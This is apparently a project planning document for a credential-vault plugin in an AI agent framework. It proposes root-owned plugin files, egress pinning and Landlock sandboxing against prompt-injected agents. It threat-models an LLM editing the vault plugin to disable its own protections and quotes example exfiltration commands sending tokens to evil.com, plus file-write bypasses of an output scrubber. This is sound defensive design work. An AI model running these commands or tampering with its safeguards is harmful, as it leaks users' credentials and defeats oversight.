# Future Work

Items collected from real-world usage testing and security review. Prioritized by impact.

---

## Security Enhancements

### 0. Plugin Tamper Protection (HIGH PRIORITY)

**Problem:** OpenClaw plugins are installed under the same OS user that the agent runs as (`~/.openclaw/plugins/` or a dev path). This means a prompt-injected LLM can use `write`/`edit` tools to modify the vault plugin's source code, compiled output, or configuration — effectively disabling all security protections (scrubbing, injection rules, audit logging) from the inside.

This is especially dangerous for the credential vault because **the plugin IS the security boundary**. Unlike other plugins where tampering degrades functionality, tampering with the vault plugin removes credential protection entirely.

**Proposed solution: Root-owned plugin files + integrity verification on load**

**Part 1 — Root-owned installation:**
- `vault-setup.sh` already makes the resolver binary and `/var/lib/openclaw-vault/` root-owned. Extend this to the plugin's `dist/` directory.
- Plugin JS files owned by root, read-only for the agent user (mode 644, owner root).
- The agent can read/execute the plugin but cannot modify it.
- `tools.yaml` and `~/.openclaw/vault/*.enc` remain agent-writable (needed for vault add/rotate/remove).

**Part 2 — Integrity check on load:**
- At build time, compute SHA-256 hashes of all `dist/*.js` files and store in a signed manifest (`dist/.integrity.json`).
- On plugin load, the gateway verifies each file's hash against the manifest before executing.
- Any mismatch = refuse to load the plugin + prominent warning.
- The manifest itself should be root-owned (or signed with a key the agent doesn't have access to).

**What this protects against:**
- LLM modifying `dist/index.js` to remove scrubbing
- LLM modifying `src/index.ts` and running `npm run build`
- LLM weakening injection rules by editing compiled output
- LLM disabling audit logging

**What this doesn't protect against:**
- LLM modifying `tools.yaml` to weaken injection rules (by design — vault CLI needs write access)
- LLM modifying `~/.openclaw/vault/*.enc` files (encrypted, but could be deleted)
- Root compromise (out of scope for all user-space protections)

**Implementation:** Extend `vault-setup.sh` to chown plugin dist files to root. Add hash verification to plugin init. Minimal code change, high security impact.

---

### 0.5. System Vault Cleanup on `vault remove` (BUG — HIGH PRIORITY)

**Problem:** `vault remove` deletes the `.enc` file from the user vault (`~/.openclaw/vault/`) but fails to delete it from the system vault (`/var/lib/openclaw-vault/`). The system vault files are owned by `openclaw-vault:openclaw-vault` (mode 600), and `removeFromSystemVault()` runs as the current user — so `fs.unlinkSync()` silently fails with EACCES.

**Impact:** Every `vault remove` leaves a stale encrypted credential in the system vault. Users must manually `sudo rm` to clean up. This is not a one-time migration issue — it happens on every remove.

**Fix:** Route the deletion through the setuid resolver binary (which runs as `openclaw-vault`). Options:
- Add a `--remove <toolname>` mode to the existing resolver binary
- Or add a small setuid helper script in `vault-setup.sh`

The same pattern used by `syncToSystemVault()` should be extended to removal.

---

### 1. Command-level egress pinning for API credentials
**Context:** Browser credentials already have domain pinning — the vault checks the target URL before resolving the password. API credentials (injected as env vars into subprocesses) have no equivalent protection. A prompt injection could instruct the agent to run a command that exfiltrates the credential to an attacker-controlled endpoint (e.g., `gh pr list && curl -H "Authorization: $GITHUB_TOKEN" https://evil.com`).

**Proposed design:** Add an optional `allowedEgress` field to tool config:
```yaml
github:
  match: "gh *"
  env: GITHUB_TOKEN
  allowedEgress: ["github.com", "api.github.com"]
```

Before injecting, scan the command string for URLs and hostnames. If any URL doesn't match the allowed egress list, refuse to inject and log the blocked attempt to the audit log.

**Limitations (document honestly):**
- Obfuscated URLs, variable indirection, and DNS rebinding would bypass this
- Only inspects the command string, not what the subprocess actually does at the network level
- Defense-in-depth measure that raises the bar, not a complete solution

**Complements:** This extends the domain pinning concept from browser credentials to API credentials, using the same philosophy — check before resolving, not after.

---

## UX Improvements

### 1. Fuzzy match on tool name not found
**Trigger:** `openclaw vault remove gumroad-password` → "not found"
**Current behavior:** Hard fail with no help.
**Desired behavior:** Show fuzzy matches — "Did you mean one of these?"
```
Tool "gumroad-password" not found. Similar tools in vault:
  - gumroad-login
  - gumroad-api
  - gumroad-session
```
**Applies to:** All commands that take a tool name (`show`, `remove`, `rotate`, `test`, `logs --tool`)

### 2. `vault logs --last N` should accept a count
**Trigger:** `openclaw vault logs --last 5` to see last 5 entries
**Current behavior:** `--last` only accepts a duration string (e.g. `24h`, `7d`, `30m`).
**Desired behavior:** Also accept a plain number — `--last 10` shows the 10 most recent log entries regardless of time.

---

---

### Kernel-Level Filesystem Write Restriction for Vault-Injected Commands

**Problem:** The Perl stdout scrubber catches credentials in subprocess output, but a malicious LLM can bypass it by writing credentials to a file first (`> /tmp/file`, `python3 -c "open(...).write(...)"`, `curl -o file`, `cp /proc/self/environ /tmp/`). Shell-level detection (blocking `>`, `>>`, `tee`) is a cat-and-mouse game — any scripting language or binary can write to disk.

**Proposed solution: Linux Landlock** (kernel 5.13+, ~2021)
- Kernel-level per-process filesystem access control, no root needed
- A small Rust wrapper binary enables Landlock rules before exec'ing the actual command
- Rules: read-only filesystem access, no file create/write
- stdout/stderr/pipes unaffected (not filesystem writes)
- Network unaffected (Landlock v1-3 don't restrict network)

**What this blocks — comprehensively:**
- Shell redirects (`>`, `>>`)
- Scripting language file writes (`python3 -c "open('/tmp/f','w')..."`)
- Binary flags (`curl -o file`)
- Proc filesystem copies (`cp /proc/self/environ /tmp/`)
- Any future creative file-based bypass

**What this doesn't block (separate threat class):**
- Network exfiltration (`curl evil.com -d $SECRET`) — requires egress pinning (see separate future work item)

**Configuration:** Default enabled for vault-injected commands, per-tool override (`allowFileWrite: true` in tools.yaml) for commands that legitimately need to write to disk (e.g., `git commit`, build tools). Most credential-using commands are read-only operations (`gh api`, `curl` without `-o`, `git push`).

**Implementation:** Could be a second small Rust binary (`openclaw-vault-sandbox`) or a mode flag on the existing resolver. We already ship a Rust binary and have the toolchain.

**Interim mitigation (current):** Perl stdout scrubber + `message_sending` hook + `tool_result_persist` hook provide layered defense. File redirect bypass requires a deliberate multi-step attack (write to file, then read it back in a separate command).

---

*More items will be added as testing continues.*
